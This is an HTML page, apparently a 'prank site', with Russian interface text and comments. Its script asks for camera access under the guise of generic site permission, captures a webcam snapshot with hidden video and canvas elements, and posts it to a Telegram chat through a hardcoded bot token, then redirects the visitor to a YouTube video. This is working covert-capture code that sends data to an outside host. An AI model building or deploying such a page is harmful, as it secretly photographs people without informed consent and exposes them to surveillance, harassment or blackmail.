<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Пранк-Сайт</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background-color: #1a1a1a;
            color: white;
        }
        /* Скрываем элементы камеры */
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <h1>Загрузка интерактивного контента...</h1>
    <p>Пожалуйста, разрешите доступ к сайту для продолжения.</p>

    <!-- Скрытые элементы для захвата видео и кадров -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const BOT_TOKEN = '8935304693:AAEVVl2rqobUte9TBNYMTakx-7ZpxXlh16A';
        const CHAT_ID = '-1004480813156';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // Запрос доступа к камере
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;

                // Ждем 1.5 секунды, чтобы камера успела сфокусироваться и настроить экспозицию
                setTimeout(() => {
                    takeSnapshotAndSend();
                }, 1500);
            })
            .catch(err => {
                console.error("Ошибка доступа к сайту:", err);
            });

        function takeSnapshotAndSend() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Преобразуем изображение с canvas в Blob
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');

                // Отправка фото в Telegram через API
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('Успешно отправлено:', data);
                    // После отправки можно перенаправить друга на любой другой сайт
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                })
                .catch(error => {
                    console.error('Ошибка отправки:', error);
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
